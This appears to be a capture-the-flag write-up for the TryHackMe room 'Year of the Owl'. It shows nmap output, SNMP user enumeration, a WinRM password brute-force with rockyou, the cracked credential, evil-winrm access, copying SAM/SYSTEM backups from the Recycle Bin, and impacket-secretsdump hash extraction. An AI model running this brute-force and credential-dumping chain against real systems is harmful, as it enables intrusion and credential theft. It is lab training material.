# -THM-Year-of-the-Owl


### We start with nmap 

```
nmap -p- -sVC --min-rate 5000 -vv -oN nmap_scan 10.10.236.210
```


```
# Nmap 7.95 scan initiated Thu Sep 18 12:07:04 2025 as: /usr/lib/nmap/nmap --privileged -p- -sVC --min-rate 5000 -vv -oN nmap_scan 10.10.236.210
Nmap scan report for 10.10.236.210
Host is up, received syn-ack ttl 127 (0.090s latency).
Scanned at 2025-09-18 12:07:04 UTC for 81s
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_http-title: Year of the Owl
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
|_http-title: Year of the Owl
445/tcp   open  microsoft-ds? syn-ack ttl 127
3306/tcp  open  mysql         syn-ack ttl 127 MariaDB 10.3.24 or later (unauthorized)
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=year-of-the-owl
| Issuer: commonName=year-of-the-owl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-17T12:05:19
| Not valid after:  2026-03-19T12:05:19
| MD5:   4cba:526e:5966:b487:7d9c:1e6d:f5f4:6b78
| SHA-1: 79ce:a4cd:2744:206f:649f:ed7c:62f2:e23b:a33b:c8b9
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQfqqn/yRjw7lK65lAyja8vDANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw95ZWFyLW9mLXRoZS1vd2wwHhcNMjUwOTE3MTIwNTE5WhcNMjYw
| MzE5MTIwNTE5WjAaMRgwFgYDVQQDEw95ZWFyLW9mLXRoZS1vd2wwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXFVZ4OXTZK1dodL9jN2u2/rOzbz5qe/Xz
| 43qMlnvGIocS/XpFOxjgU/BcGs8Nsyv9383ZnmoXejjOTaK32XrIChasUv7cFV7/
| DH1Rv5vXE7AUrBFa0TOvdSPLNcbyMfDO+w9sR+I7es1ZeVRBTV9pqLSO/FADilOG
| xoXoPr6QFi4sT+XwiTmViUg5SLFjysZVYugibMtvOYRphWvA7l4RnaPP5/TQj8Fx
| xevC3q7w+d+PTrG3Q1nBGJt/FbcTvNnA9QQyMCHm5xI55LmVZBIcCwkHLbvuuSjq
| sTAOWCpMdDCQiGScCYinQGS8s0+5C4GvnIEa2j2YMWYhC2KgLhvlAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEABYHUx3GG6NewXo8cj79VWeRQcFOCBYmoFVYVOC2CsvegOoAvZ4mBh7DI
| TGcHIv/Q39K2uxeZMUMcIGOI2eRZcCISllQLUiq8zEfdgFNo6xOrApPHLkyFOHJI
| LnXFOuUeX7bBvLggo3ZnPQxFBodc1UbPXvRyGtOOrdgpPxL1B2JBFoM5BeZ6cOgg
| XfsghJxnP6+4d2Y3Zc5PErxX5qTyJSYgDap4GDYm3AkGE51aJpYIdleC26855Zzu
| EibQh1EnmoMNWkLYchANwGdmndQjQz/pw/iuxfMXQ9edY7YEocxwZKqTre8lE7rR
| 8c2+A6sgC1njqpCH0aDIbjkD7bnl5A==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-09-18T12:08:23+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: YEAR-OF-THE-OWL
|   NetBIOS_Domain_Name: YEAR-OF-THE-OWL
|   NetBIOS_Computer_Name: YEAR-OF-THE-OWL
|   DNS_Domain_Name: year-of-the-owl
|   DNS_Computer_Name: year-of-the-owl
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-18T12:07:43+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-18T12:07:48
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55773/tcp): CLEAN (Timeout)
|   Check 2 (port 21845/tcp): CLEAN (Timeout)
|   Check 3 (port 37160/udp): CLEAN (Timeout)
|   Check 4 (port 63659/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: -1s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 18 12:08:25 2025 -- 1 IP address (1 host up) scanned in 81.76 seconds
```

### We have an empty page on port 80

<img width="1752" height="806" alt="image" src="https://github.com/user-attachments/assets/1b73eb8b-3cdc-45a3-b138-a28ec1eb479f" />

### I use snmp-check and find the username Jareth 

```
snmp-check 10.10.236.210 -c openview
```


### After I tried to brute-force the password with nxc


```
YTHONWARNINGS="ignore" nxc winrm 10.10.236.210 -u "Jareth" -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding | grep +
```

<img width="1089" height="87" alt="image" src="https://github.com/user-attachments/assets/fcde0a1e-e9da-4eeb-85f4-2412b7bebcff" />

```
Jareth:sarah
```

### I connected to winrm and get the user flag 

```
evil-winrm -i 10.10.236.210 -u "Jareth" -p "sarah"
```

<img width="528" height="261" alt="image" src="https://github.com/user-attachments/assets/1a4c0800-36f1-463a-a8d8-56a092aa8c40" />

### I checked the directories and found the Recycle Bin in C:\

```
Get-ChildItem -Path C:\ -Force
```
<img width="715" height="353" alt="image" src="https://github.com/user-attachments/assets/eaaa0f39-07bc-4f4a-9a27-cc333ab83b27" />

### I tried to copy the directory, but it didn t work. However, we found the full path.

```
Get-ChildItem -Path 'C:\$Recycle.Bin' -Force -Recurse | Copy-Item -Destination C:\Users\ -Force -Recurse -ErrorAction SilentlyContinue
```

<img width="1262" height="117" alt="image" src="https://github.com/user-attachments/assets/a63b38b7-9a13-4bc2-9adf-a09835839afa" />

### I tried to copy it, but it was empty, so I went back one directory to find another S-1...

<img width="881" height="36" alt="image" src="https://github.com/user-attachments/assets/1cb66894-39fa-4c04-87a3-883d41796f2a" />

<img width="921" height="226" alt="image" src="https://github.com/user-attachments/assets/76193a2e-2382-4287-bf4f-b81fb82a03ae" />

### I copied them to Jareth s desktop and downloaded them


```
cp * 'C:\Users\Jareth\Desktop'
```

<img width="947" height="778" alt="image" src="https://github.com/user-attachments/assets/3ecc575e-3433-4521-aa3b-d6467363ef61" />

### I used secretsdump to extract the hashes


```
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

<img width="1086" height="395" alt="image" src="https://github.com/user-attachments/assets/c16c7555-f8a2-42ca-8ebc-a2ba76d3ca60" />

### And found the admin flag

<img width="560" height="59" alt="image" src="https://github.com/user-attachments/assets/5dc37a2f-2f61-45da-abf0-115d2f251a0f" />


